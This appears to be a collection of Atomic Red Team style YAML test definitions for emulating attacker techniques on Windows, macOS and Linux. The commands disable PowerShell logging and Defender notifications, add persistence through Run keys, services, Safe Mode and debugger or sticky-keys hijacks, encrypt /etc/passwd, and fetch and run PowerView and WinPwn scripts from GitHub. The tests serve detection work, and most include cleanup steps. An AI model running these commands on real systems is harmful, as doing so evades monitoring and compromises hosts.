    Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution
    see https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging
  supported_platforms:
  - windows
  executor:
    command: |
      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
      REM do a little cleanup immediately to avoid execution issues with later tests
      reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1
    cleanup_command: |
      reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /f >nul 2>&1
      reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1
      reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Windows Add Registry Value to Load Service in Safe Mode without Network
  auto_generated_guid: 1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5
  description: |
    Modify the registry to allow a driver, service, to persist in Safe Mode.
    see https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.
    Adding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.
  supported_platforms:
  - windows
  executor:
    command: |
      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
    cleanup_command: |
      reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /f
    name: command_prompt
    elevation_required: true
- name: Windows Add Registry Value to Load Service in Safe Mode with Network
  auto_generated_guid: c173c948-65e5-499c-afbe-433722ed5bd4
  description: |
    Modify the registry to allow a driver, service, to persist in Safe Mode with networking.
    see https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.
    Adding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.
  supported_platforms:
  - windows
  executor:
    command: |
      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
    cleanup_command: |
      reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /f
    name: command_prompt
    elevation_required: true
- name: Disable Windows Toast Notifications
  auto_generated_guid: 003f466a-6010-4b15-803a-cbb478a314d7
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
    cleanup_command: |
      reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Disable Windows Security Center Notifications
  auto_generated_guid: 45914594-8df6-4ea9-b3cc-7eb9321a807e
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
    cleanup_command: |
      reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Suppress Win Defender Notifications
  auto_generated_guid: c30dada3-7777-4590-b970-dc890b8cf113
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Allow RDP Remote Assistance Feature
  auto_generated_guid: 86677d0e-0b5e-4a2b-b302-454175f9aa9e
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific
    user to rdp connect on the targeted machine.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: NetWire RAT Registry Key Creation
  auto_generated_guid: 65704cd4-6e36-4b90-b6c1-dc29a82c8e56
  description: |
    NetWire continues to create its home key (HKCU\SOFTWARE\NetWire) as well as adding it into the auto-run group in the victim’s registry.
    See how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d "C:\Users\admin\AppData\Roaming\Install\Host.exe" /f
      reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f
      reg add HKCU\SOFTWARE\NetWire /v "Install Date" /t REG_SZ /d "2021-08-30 07:17:27" /f
    cleanup_command: |
      reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /f >nul 2>&1
      reg delete HKCU\SOFTWARE\NetWire /va /f >nul 2>&1
      reg delete HKCU\SOFTWARE\NetWire /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Ursnif Malware Registry Key Creation
  auto_generated_guid: c375558d-7c25-45e9-bd64-7b23a97c1db0
  description: |
      Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\
      More information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
    cleanup_command: |
      reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1
      reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Terminal Server Client Connection History Cleared
  auto_generated_guid: 3448824b-3c35-4a9e-a8f5-f887f68bea21
  description: |
      The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Must have the "MR9" Remote Desktop Connection history Key 
    prereq_command: |
      if ((Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Default\").MR9) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -path "HKCU:\SOFTWARE\Microsoft\" -name "Terminal Server Client"  -ErrorAction Ignore
      New-Item -path "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\" -name "Default" -ErrorAction Ignore
      New-Itemproperty -path "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Default" -name "MR9" -value "127.0.0.1"  -PropertyType "String" -ErrorAction Ignore
      New-Item -path "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\" -name "Servers" -ErrorAction Ignore
      New-Item -path "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers" -name "Redcanary" -ErrorAction Ignore
  executor:
    command: |
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
      reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
    name: command_prompt
    elevation_required: true
- name: Disable Windows Error Reporting Settings
  auto_generated_guid: d2c9e41e-cd86-473d-980d-b6403562e3e1
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems 
    encounter in specific application or process.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
      reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
      reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: DisallowRun Execution Of Certain Application
  auto_generated_guid: 71db768a-5a9c-4047-b5e7-59e01f188e84
  description: |
    Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it 
    using security product.
    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
  supported_platforms:
  - windows
  executor:
    command: |
      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f
      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
    cleanup_command: |
      reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /f >nul 2>&1
      reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 1 /f >nul 2>&1
    name: command_prompt
    elevation_required: true



- name: Running Chrome VPN Extensions via the Registry 2 vpn extension
  auto_generated_guid: 4c8db261-a58b-42a6-a866-0a294deedde4
  description: |
    Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see "T1133\src\list of vpn extension.txt" to view complete list
  supported_platforms:
    - windows
  input_arguments:
    chrome_url:
      description: chrome installer download URL
      type: Url
      default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
    extension_id:
      description: chrome extension id
      type: String
      default: | 
        "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
  dependency_executor_name: powershell
  dependencies: 
    - description: |
        Chrome must be installed
      prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
      get_prereq_command: | 
        Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
        Start-Process $env:temp\ChromeStandaloneSetup64.exe /S     
  executor:
    name: powershell
    elevation_required: true
    command: | 
      $extList = #{extension_id}
      foreach ($extension in $extList) {
        New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
        New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
      Start chrome
      Start-Sleep -Seconds 30
      Stop-Process -Name "chrome"
    cleanup_command: | 
      $extList = #{extension_id}
      foreach ($extension in $extList) {
      Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}



- name: Network Share Discovery
  auto_generated_guid: f94b5ad9-911c-4eff-9718-fd21899db4f7
  description: |
    Network Share Discovery
  supported_platforms:
  - macos
  input_arguments:
    computer_name:
      description: Computer name to find a mount on.
      type: String
      default: computer1
  executor:
    command: |
      df -aH
      smbutil view -g //#{computer_name}
      showmount #{computer_name}
    name: sh
- name: Network Share Discovery - linux
  auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
  description: |
    Network Share Discovery using smbstatus
  supported_platforms:
  - linux
  input_arguments:
    package_checker:
      description: Package checking command. Debian - dpkg -s samba
      type: String
      default: (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)
    package_installer:
      description: Package installer command. Debian - apt install samba
      type: String
      default: (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)
  dependency_executor_name: bash
  dependencies:
  - description: |
      Package with smbstatus (samba) must exist on device
    prereq_command: |
      if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
    get_prereq_command: |
      sudo #{package_installer} 
  executor:
    command: |
      sudo smbstatus --shares
    name: bash
    elevation_required: true
- name: Network Share Discovery command prompt
  auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
  description: |
    Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
    Upon execution avalaible network shares will be displayed in the powershell session
  supported_platforms:
  - windows
  input_arguments:
    computer_name:
      description: Computer name to find a mount on.
      type: String
      default: localhost
  executor:
    command: |
      net view \\#{computer_name}
    name: command_prompt
- name: Network Share Discovery PowerShell
  auto_generated_guid: 1b0814d1-bb24-402d-9615-1b20c50733fb
  description: |
    Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
    Upon execution, avalaible network shares will be displayed in the powershell session
  supported_platforms:
  - windows
  executor:
    command: |
      get-smbshare
    name: powershell
- name: View available share drives
  auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
  description: View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session
  supported_platforms:
  - windows
  executor:
    command: |
      net share
    name: command_prompt
- name: Share Discovery with PowerView
  auto_generated_guid: b1636f0a-ba82-435c-b699-0d78794d8bfd
  description: |
    Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Endpoint must be joined to domain
    prereq_command: |
      if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}
    get_prereq_command: |
      "Join system to domain"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
    name: powershell
- name: PowerView ShareFinder
  auto_generated_guid: d07e4cc1-98ae-447e-9d31-36cb430d28c4
  description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
  supported_platforms:
  - windows
  input_arguments:
    parameters:
      description: ShareFinder parameter
      type: String
      default: -CheckShareAccess
  dependencies:
  - description: Invoke-ShareFinder module must exist in %TEMP% directory
    prereq_command: 'if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}'
    get_prereq_command: |
      Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile $env:TEMP\PowerView.ps1
  executor:
    command: |
      Import-Module $env:TEMP\PowerView.ps1
      Invoke-ShareFinder #{parameters}
    name: powershell
- name: WinPwn - shareenumeration
  auto_generated_guid: 987901d1-5b87-4558-a6d9-cffcabc638b8
  description: Network share enumeration using the shareenumeration function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      shareenumeration -noninteractive -consoleoutput
    name: powershell



- name: Encrypt files using gpg (Linux)
  auto_generated_guid: 7b8ce084-3922-4618-8d22-95f996173765
  description: |
    Uses gpg to encrypt a file
  supported_platforms:
    - linux
  input_arguments:
    pwd_for_encrypted_file:
      description: the password that you want for the encrypted file
      type: String
      default: passwd
    encrypted_file_path:
      description: path to the encrypted file
      type: Path
      default: /tmp/passwd.gpg
    input_file_path:
      description: path to the file that you want to encrypt
      type: Path
      default: /etc/passwd
    encryption_alg:
      description: encryption algorithm of the file
      type: String
      default: AES-256
  dependency_executor_name: bash
  dependencies:
    - description: |
        Finds where gpg is located
      prereq_command: |
        which_gpg=`which gpg`
      get_prereq_command: |
        (which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)
  executor:
    name: bash
    elevation_required: false
    command: |
      echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
    cleanup_command: |
      rm #{encrypted_file_path}


- name: Encrypt files using 7z (Linux)
  auto_generated_guid: 53e6735a-4727-44cc-b35b-237682a151ad
  description: |
    Uses 7z to encrypt a file
  supported_platforms:
    - linux
  input_arguments:
    pwd_for_encrypted_file:
      description: the password that you want for the encrypted file
      type: String
      default: passwd
    encrypted_file_path:
      description: path to the encrypted file
      type: Path
      default: /tmp/passwd.zip
    input_file_path:
      description: path to the file that you want to encrypt
      type: Path
      default: /etc/passwd
  dependency_executor_name: bash
  dependencies:
    - description: |
        Finds where 7z is located
      prereq_command: |
        which_7z=`which 7z`
      get_prereq_command: |
  executor:
    name: bash
    elevation_required: false
    command: |
      $which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
    cleanup_command: |
      $which_7z e #{encrypted_file_path}
      rm #{encrypted_file_path}


- name: Encrypt files using ccrypt (Linux)
  auto_generated_guid: 08cbf59f-85da-4369-a5f4-049cffd7709f
  description: |
      Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.
  supported_platforms:
    - linux
  input_arguments:
    cped_file_path:
      description: path where you want your copied file to be
      type: Path
      default: /tmp/passwd
    root_input_file_path:
      description: path to the file that you want to be encrypted if you are root user
      type: Path
      default: /etc/passwd
    user_input_file_path:
      description: path to file that you want to be encrypted if you are normal user
      type: Path
      default: ~/.bash_history
    impact_command:
      description: command to show impact of encryption
      type: String
      default: sudo su
  dependency_executor_name: bash
  dependencies:
    - description: |
        Finds where ccencrypt and ccdecrypt is located and copies input file
      prereq_command: |
        which_ccencrypt=`which ccencrypt`
        which_ccdecrypt=`which ccdecrypt`
        if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
      get_prereq_command: |
        (which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)
  executor:
    name: bash
    elevation_required: false
    command: |
      if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
    cleanup_command: |
      if [[ $USER == "root" ]]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi 


- name: Encrypt files using openssl (Linux)
  auto_generated_guid: 142752dc-ca71-443b-9359-cf6f497315f1
  description: |
    Uses openssl to encrypt a file
  supported_platforms:
    - linux
  input_arguments:
    private_key_path:
      description: path to the private key
      type: Path
      default: /tmp/key.pem
    public_key_path:
      description: path to the public key
      type: Path
      default: /tmp/pub.pem
    encryption_bit_size:
      description: size of the bit of encryption
      type: Integer
      default: 2048
    encrypted_file_path:
      description: path to the encrypted file
      type: Path
      default: /tmp/passwd.zip
    input_file_path:
      description: path to the file that you want to encrypt
      type: Path
      default: /etc/passwd 
  dependency_executor_name: bash
  dependencies:
    - description: |
        Finds where openssl is located
      prereq_command: |
        which_openssl=`which openssl`
      get_prereq_command: |
  executor:
    name: bash
    elevation_required: false
    command: |
      $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
      $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
      $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
    cleanup_command: |
      $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
      rm #{encrypted_file_path}

- name: PureLocker Ransom Note
  auto_generated_guid: 649349c7-9abf-493b-a7a2-b1aa4d141528
  description: |
    building the IOC (YOUR_FILES.txt) for the PureLocker ransomware 
    https://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/

  supported_platforms:
    - windows

  executor:
    name: command_prompt
    elevation_required: true 
    command: | 
      echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
    cleanup_command: | 
      del %USERPROFILE%\Desktop\YOUR_FILES.txt >nul 2>&1



- name: macOS/Linux - Simulate CPU Load with Yes
  auto_generated_guid: 904a5a0e-fb02-490d-9f8d-0e256eb37549
  description: |
    This test simulates a high CPU load as you might observe during cryptojacking attacks.
    End the test by using CTRL/CMD+C to break.
  supported_platforms:
  - macos
  - linux
  executor:
    command: |
      yes > /dev/null
    name: bash



- name: Modify Fax service to run PowerShell
  auto_generated_guid: ed366cde-7d12-49df-a833-671904770b9f
  description: |
    This test will temporarily modify the service Fax by changing the binPath to PowerShell
    and will then revert the binPath change, restoring Fax to its original state.
    Upon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.
  supported_platforms:
    - windows

  executor:
    name: command_prompt
    elevation_required: true
    command: |
      sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
      sc start Fax
    cleanup_command:
      sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1

- name: Service Installation CMD
  auto_generated_guid: 981e2942-e433-44e9-afc1-8c957a1496b6
  description: |
    Download an executable from github and start it as a service.
    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
  supported_platforms:
    - windows
  input_arguments:
    binary_path:
      description: Name of the service binary, include path.
      type: Path
      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
    service_name:
      description: Name of the Service
      type: String
      default: AtomicTestService_CMD

  dependency_executor_name: powershell
  dependencies:
    - description: |
        Service binary must exist on disk at specified location (#{binary_path})
      prereq_command: |
        if (Test-Path #{binary_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      sc.exe create #{service_name} binPath= #{binary_path}
      sc.exe start #{service_name}
    cleanup_command: |
      sc.exe stop #{service_name} >nul 2>&1
      sc.exe delete #{service_name} >nul 2>&1
- name: Service Installation PowerShell
  auto_generated_guid: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
  description: |
      Installs A Local Service via PowerShell.
      Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
  supported_platforms:
    - windows
  input_arguments:
    binary_path:
      description: Name of the service binary, include path.
      type: Path
      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
    service_name:
      description: Name of the Service
      type: String
      default: AtomicTestService_PowerShell

  dependency_executor_name: powershell
  dependencies:
    - description: |
        Service binary must exist on disk at specified location (#{binary_path})
      prereq_command: |
        if (Test-Path #{binary_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
  executor:
    name: powershell
    elevation_required: true
    command: |
      New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
      Start-Service -Name "#{service_name}"
    cleanup_command: |
      Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
      try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
      catch {}
- name: TinyTurla backdoor service w64time
  auto_generated_guid: ef0581fd-528e-4662-87bc-4c2affb86940
  description: |
    It's running Dll as service to emulate the TinyTurla backdoor
    
    [Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
  supported_platforms:
  - windows
  input_arguments:
    dllfilename:
      description: It specifies Dll file to run as service
      type: string
      default: $PathToAtomicsFolder\T1543.003\bin\w64time.dll
  executor:
    command: |-
      copy #{dllfilename} %systemroot%\system32\
      sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
      sc config W64Time DisplayName= "Windows 64 Time"
      sc description W64Time "Maintain date and time synch on all clients and services in the network"
      reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
      sc start W64Time
    cleanup_command: |-
      sc stop W64Time
      sc.exe delete W64Time
      del %systemroot%\system32\w64time.dll
      reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
      reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
    name: command_prompt
    elevation_required: true



- name: Attaches Command Prompt as a Debugger to a List of Target Processes
  auto_generated_guid: 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9
  description: |
    Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.
    Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.
  supported_platforms:
  - windows
  input_arguments:
    parent_list:
      description: |
        Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: "osk.exe"
      type: String
      default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe
    attached_process:
      description: |
        Full path to process to attach to target in #{parent_list}. Default: cmd.exe
      type: Path
      default: C:\windows\system32\cmd.exe
  executor:
    command: |
      $input_table = "#{parent_list}".split(",")
      $Name = "Debugger"
      $Value = "#{attached_process}"
      Foreach ($item in $input_table){
        $item = $item.trim()
        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
        IF(!(Test-Path $registryPath))
        {
          New-Item -Path $registryPath -Force
          New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
        }
        ELSE
        {
          New-ItemProperty -Path $registryPath -Name $name -Value $Value
        }
      }
    cleanup_command: |
      $input_table = "#{parent_list}".split(",")
      Foreach ($item in $input_table)
      {
        $item = $item.trim()
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
      }
    name: powershell
    elevation_required: true
- name: Replace binary of sticky keys
  auto_generated_guid: 934e90cf-29ca-48b3-863c-411737ad44e3
  description: |
    Replace sticky keys binary (sethc.exe) with cmd.exe
  supported_platforms:
  - windows
  executor:
    command: |
      copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
      takeown /F C:\Windows\System32\sethc.exe /A
      icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
    cleanup_command: |
      copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
    name: command_prompt
    elevation_required: true
    
    
    
- name: Reg Key Run
  auto_generated_guid: e55be3fd-3521-4610-9d1a-e210e42dcf05
  description: |
    Run Key Persistence

